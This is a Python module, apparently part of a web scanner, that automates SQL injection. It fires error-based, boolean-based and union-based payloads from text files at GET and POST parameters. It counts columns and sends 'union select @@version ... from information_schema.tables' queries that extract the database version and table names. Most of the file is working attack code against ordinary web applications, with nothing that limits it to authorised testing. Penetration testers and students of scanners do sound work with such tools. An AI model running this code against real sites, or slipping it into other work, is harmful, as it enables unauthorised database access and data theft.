import requests
import os
import re
import base64
import json
import time
from urllib.request import Request, urlopen
import urllib.request
from urllib.parse import quote
from bs4 import BeautifulSoup

def make_GET_form(url: str):
    dic = {}
    dic['vuln'] = 'SQLI'
    dic['method'] = 'GET'
    dic['url'] = url
    return dic


def make_POST_form(url: str, data: dict):
    dic = {}
    dic['vuln'] = 'SQLI'
    dic['method'] = 'POST'
    dic['url'] = url
    dic['data'] = data
    return dic


def get_request(data, dic, target, cookies):
    key_list = list(dic.keys())
    for payload_name in key_list:
        tmp = dic
        tmp[payload_name] = tmp[payload_name]+'@@@@@@'
        middle_form = target
        key_list_tmp = list(tmp.keys())
        for idx, key in enumerate(key_list_tmp):
            if idx == 0:
                middle_form = middle_form + '?' + key + '=' + tmp[key]
            else:
                middle_form = middle_form + '&' + key + '=' + tmp[key]
        
        #boolean
        bool_middle_form = middle_form
        with open(os.path.dirname(os.path.realpath(__file__)) + '/sql_boolean.txt', "r", encoding='UTF8') as bool:
            data = bool.readlines()
        
        for i,payload in enumerate(data):
            try:
                true_payload, false_payload = payload.split('\t')
                if i <= 8:
                    test_form1 = bool_middle_form.replace('@@@@@@', true_payload.rstrip()) #true
                    form1_res = requests.get(test_form1,cookies=cookies)
                    #print(test_form1)
                    test_form2 = bool_middle_form.replace('@@@@@@', false_payload.rstrip()) #false
                    form2_res = requests.get(test_form2,cookies=cookies)
                    #print(test_form2)
                else:
                    test_form1 = bool_middle_form.replace(tmp[payload_name], true_payload.rstrip()) #true
                    form1_res = requests.get(test_form1,cookies=cookies)
                    #print(test_form1)
                    test_form2 = bool_middle_form.replace(tmp[payload_name], false_payload.rstrip()) #false
                    form2_res = requests.get(test_form2,cookies=cookies)
                    #print(test_form2)
                if ( abs(len(form1_res.text) - len(form2_res.text)) > 20 ):
                    True_for_test = str(BeautifulSoup(form1_res.text,"html.parser"))
                    print('find on 1')
                    return make_GET_form(test_form2)

            except:
                time.sleep(2)     

        #union
        union_middle_form = middle_form
        if col_num('get',union_middle_form, cookies) != False:
            col, payload = col_num('get',union_middle_form, cookies)
            #NON blind get table info
            for payload in data:
                try:
                    #' or 1=1 union select table_name,null from information_schema.columns#
                    true_payload, false_payload = payload.split('\t')
                    check_list = {"ubuntu","SQL Server","Microsoft SQL Server","Oracle","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
                    if true_payload.startswith('admin'):
                        break
                    if col == 1:
                        table_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select null from information_schema.tables #'))
                        table_res = requests.get(table_form,cookies=cookies)
                        ver_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select @@version#'))
                        ver_res = requests.get(ver_form,cookies=cookies)
                        for wrd in check_list:
                            if re.search(wrd, ver_res.text):
                                print('find on 6-1')
                                return make_GET_form(ver_form)
                    elif col ==2:
                        table_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select @@version,null from information_schema.columns#'))
                        table_res = requests.get(table_form,cookies=cookies)
                    else:
                        table_payload = ", null"*(col-2)
                        table_form = union_middle_form.replace('@@@@@@', quote(true_payload.strip()+' union select table_name, @@version'+table_payload+' from information_schema.tables #'))
                        table_res = requests.get(table_form,cookies=cookies)
                    
                    for wrd in check_list:
                        if re.search(wrd, table_res.text):
                            print('find on 6-2')
                            return make_GET_form(table_form)
                except:
                    time.sleep(2)
 
        #error
        err_middle_form = middle_form
        with open(os.path.dirname(os.path.realpath(__file__)) + '/sql.txt', "r", encoding='UTF8') as err_file:
            err_data = err_file.readlines()
        for j,payload in enumerate(err_data):
            if j <= 56:
                final_form = err_middle_form.replace('@@@@@@', payload.rstrip())
            else:
                final_form = err_middle_form.replace(tmp[payload_name], payload.rstrip())
            try:
                test_res = requests.get(final_form, cookies=cookies)
                if check_success(str(BeautifulSoup(test_res.text,"html.parser"))):
                    print('find on 8')
                    return make_GET_form(final_form)
            except:
                time.sleep(2)
    return False

def col_num(arg1, arg2, cookies):
    cnt=1
    f = open(os.path.dirname(os.path.realpath(__file__)) + '/sql_union.txt', "r", encoding='UTF8')
    payload1 = f.readline()
    payload2 = None

    if arg1 == 'get':
        middle_form=arg2
        #check number of column
        while True:
            try:
                test_form1 = middle_form.replace('@@@@@@', quote(payload1.strip()))
                res1 = requests.get(test_form1,cookies=cookies)
                payload1 = f.readline()
                payload2 = payload1
                if payload2 == '':
                    break
                test_form2 = middle_form.replace('@@@@@@', quote(payload2.strip()))
                res2 = requests.get(test_form2,cookies=cookies)
                if res1.text != res2.text:
                    payload3 = f.readline()
                    test_form3 = middle_form.replace('@@@@@@', quote(payload3.strip()))
                    res3 = requests.get(test_form3,cookies=cookies)
                    if str(BeautifulSoup(res2.text,"html.parser")) == str(BeautifulSoup(res3.text,"html.parser")):
                        col=cnt%15
                        f.close()
                        return col, payload1.strip()
                    else:
                        col=(cnt+1)%15
                        f.close()
                        return col, payload2.strip()
                else:
                    cnt=cnt+1
            except:
                cnt=cnt+1
                time.sleep(2)

    elif arg1.startswith('http'):
        target = arg1
        union_form = arg2

        key_list = list(union_form.keys())
        for payload_name in key_list:
            while True:
                try:
                    union_form1=union_form
                    union_form1[payload_name] = union_form[payload_name].replace(union_form[payload_name], payload1.strip())
                    res1 = requests.post(target,data=union_form1,cookies=cookies)
                    payload1 = f.readline()
                    payload2 = payload1
                    if payload2 == '':
                        break
                    union_form2 = union_form
                    union_form2[payload_name] = union_form2[payload_name].replace(union_form2[payload_name], payload2.strip())
                    res2 = requests.post(target,data=union_form2,cookies=cookies)
                    if str(BeautifulSoup(res1.text,"html.parser")) != str(BeautifulSoup(res2.text,"html.parser")):
                        payload3 = f.readline()
                        union_form3 = union_form
                        union_form3[payload_name] = union_form[payload_name].replace(union_form[payload_name], payload3.strip())
                        res3 = requests.post(target,data=union_form3,cookies=cookies)
                        if str(BeautifulSoup(res2.text,"html.parser")) == str(BeautifulSoup(res3.text,"html.parser")):
                            col=cnt%15
                            f.close()
                            return col, payload1.strip(),union_form1
                        else:
                            col=(cnt+1)%15
                            f.close()
                            return col, payload2.strip(),union_form2
                    else:
                        cnt+=1
                except:
                    time.sleep(2)
                    cnt+=1

    f.close()
    return False

def scan_type1(url: str, params: dict, cookies):

    with open(os.path.dirname(os.path.realpath(__file__)) + '/sql.txt', "r", encoding='UTF8') as f:
        data = f.readlines()
    with open(os.path.dirname(os.path.realpath(__file__)) + '/sql_boolean.txt', "r", encoding='UTF8') as bool:
        bool_data = bool.readlines()

    for items in params.values():
        target = url + items['action']
        method = items['method']
        dic = {}
        for ipt in items['inputs']:
            dic[ipt['name']] = ipt['value']

        if method == 'post':
            key_list = list(dic.keys())
            tmp = dic.copy()
            
            #error_based
            for payload_name in key_list:
                query_error = dic.copy()
                for m,payload in enumerate(data):
                    try:
                        if m <= 56:
                            query_error[payload_name]=tmp[payload_name]+payload.rstrip()
                        else:
                            query_error[payload_name]=payload.rstrip() 
                        test_res = requests.post(target, data=query_error, cookies=cookies)
                        print(query_error)
                        if check_success(str(BeautifulSoup(test_res.text,"html.parser"))):
                            print('find on 9')
                            return make_POST_form(target, query_error)
                    except:
                        time.sleep(2)
                        
                #boolean
                test_form1=dic.copy()
                test_form1[payload_name] = tmp[payload_name]+'@@@@@@'
                test_form2=dic.copy()

                for n,bool_pay in enumerate(bool_data):
                    try:
                        true_payload, false_payload = bool_pay.split('\t')
                        test_form1[payload_name] = test_form1[payload_name].replace('@@@@@@',true_payload.strip()) #true
                        form1_post = requests.post(target,data=test_form1,cookies=cookies)
                        #print(test_form1)
                        test_form1[payload_name] = test_form1[payload_name].replace(true_payload.rstrip(),'@@@@@@')
                        test_form2[payload_name] = test_form1[payload_name].replace('@@@@@@',false_payload.strip()) #false
                        form2_post = requests.post(target,data=test_form2,cookies=cookies)
                        #print(test_form2)
                        test_form1[payload_name] = test_form2[payload_name].replace(false_payload.rstrip(),'@@@@@@')

                        if (abs(len(str(BeautifulSoup(form1_post.text,"html.parser")))-len(str(BeautifulSoup(form2_post.text,"html.parser"))))>20) :
                            print('find on 10')
                            return make_POST_form(target, test_form2)

                    except:
                        time.sleep(2)
            
            #union
            table_form=dic.copy()
            tmp_form = dic.copy()                

            if col_num(target, table_form, cookies) != False:
                col, tmp_payload,col_form= col_num(target, table_form,cookies)
                for payload_name in key_list:
                    for bool_pay in bool_data:
                        try:
                            true_payload, false_payload = bool_pay.split('\t')
                            check_list = {"ubuntu","SQL Server","Microsoft SQL Server","Oracle","MYSQL","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
                            if true_payload.startswith('admin'):
                                break
                        
                            if col ==1:
                                table_form[payload_name] = tmp_form[payload_name]+true_payload.strip()+' union select null from information_schema.tables #'
                                table_res = requests.post(target,data=table_form,cookies=cookies)
                            elif col ==2:
                                table_form[payload_name] = tmp_form[payload_name]+true_payload.strip()+' union select @@version,null from information_schema.columns#'
                                table_res = requests.post(target,data=table_form,cookies=cookies)
                            else:
                                table_payload = ", null"*(col-2)
                                table_form[payload_name] = tmp_form[payload_name]+true_payload.strip()+' union select table_name, @@version'+table_payload+' from information_schema.tables #'
                                table_res = requests.post(target,data=table_form,cookies=cookies)
                            
                            #if you can see result
                            for wrd in check_list:
                                if re.search(wrd, table_res.text):
                                    print('find on 9')
                                    return make_POST_form(target, table_form)
                        except:
                            time.sleep(2)

                if 'UNION' or 'union' in col_form[payload_name]:
                    col_form[payload_name] = tmp_payload
                    print('find on 19')
                    return make_POST_form(target, col_form)

        elif method == 'get':
            return get_request(data, dic, target, cookies)
        else:
            print('Error in ' + target + ', method type must be assigned')
            return False
    return False


def scan_type2(url: str, cookies):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/sql.txt', "r", encoding='UTF8') as f:
        data = f.readlines()

    params = re.split('[=&?]', url)
    target = params[0]
    del (params[0])
    key = ''
    dic = {}
    for i in range(len(params)):
        if i % 2 == 0:
            key = params[i]
        else:
            dic[key] = params[i]

    return get_request(data, dic, target, cookies)

def check_success(res):         
    check_list = {"SQL syntax","valid MySQL","warning: mysql","ODBC Microsoft Access Driver","java.sql.SQLException","XPathException","valid ldap","javax.naming.NameNotFoundException","unclosed quotation mark after the character string", "quoted string not properly terminated","SQL Server","syntax error","XPATH syntax error","OLE DB provider","Microsoft SQL Server","OleDb.OleDbException","Microsoft SQL Native Client error","ubuntu","Microsoft SQL Server","Oracle","Postre SQL", "MSSQL", "Microsoft JET Database Engine", "ORA-00933:","PSQLException"}
    for wrd in check_list:
        if re.search(wrd, res):
            return True
    return False


def sqli_attack(arg1: str, arg2, cookies):
    if arg1.startswith('http'):
        return scan_type1(arg1, arg2, cookies)
    elif arg1 == 'get':
        return scan_type2(arg2, cookies)
    else:
        print('Error in sql_attack')
        return False